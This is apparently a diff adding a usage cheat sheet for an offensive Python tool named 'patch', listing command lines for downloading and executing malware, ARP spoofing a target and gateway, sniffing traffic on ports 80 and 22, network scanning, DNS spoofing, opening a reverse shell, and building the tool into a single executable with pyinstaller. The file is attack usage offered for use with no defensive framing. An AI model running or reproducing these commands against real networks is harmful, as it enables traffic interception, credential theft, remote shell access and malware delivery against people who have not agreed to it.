@@ -1,0 +1,27 @@
+
+# Malware Software Execution
+patch --download --execute --overwrite
+
+# ARP SPOOFING
+patch --arp_spoof --target 192.168.10.6 --gateway 192.168.10.7 --interface "eth0" --reverse
+patch --arp_spoof --target 192.168.10.6 --gateway 192.168.10.7 --reverse
+
+# Sniffing
+patch --sniff --interface "lo" 
+patch --sniff --filter "tcp port 80" --interface "lo"
+patch --sniff --filter "tcp port 22" --interface "eth0"
+
+# Scanning Command
+patch --scan --ip 192.168.10.6
+patch --scan --ip 192.168.10.7
+patch --scan --ip 192.168.10.0/24
+patch --scan --interface "eth0"
+
+# DNS SPOOF
+patch --dns_spoof
+
+# Reverse Shell
+patch --reverse_shell 
+
+# Build Command
+pyinstaller --exclude-module PyQt5 -F patch.py
